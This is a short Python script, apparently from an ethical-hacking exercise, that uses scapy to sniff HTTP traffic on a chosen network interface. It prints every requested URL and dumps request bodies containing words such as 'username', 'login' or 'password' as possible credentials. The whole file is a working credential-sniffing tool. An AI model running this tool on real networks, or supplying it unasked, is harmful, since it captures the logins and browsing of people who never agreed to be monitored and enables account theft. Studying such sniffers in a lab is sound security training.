#!/usr/bin/env python3
import scapy.all as scapy
import optparse
from scapy.layers import http

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface of the machine to sniff")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
        url = host + path
        print("[+] HTTP Request >> " + url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load.lower():
                    print("\n\n[+] Possible credentials:" + load)
                    print("-" * 50)
                    break

options = get_arguments()
sniff(options.interface)
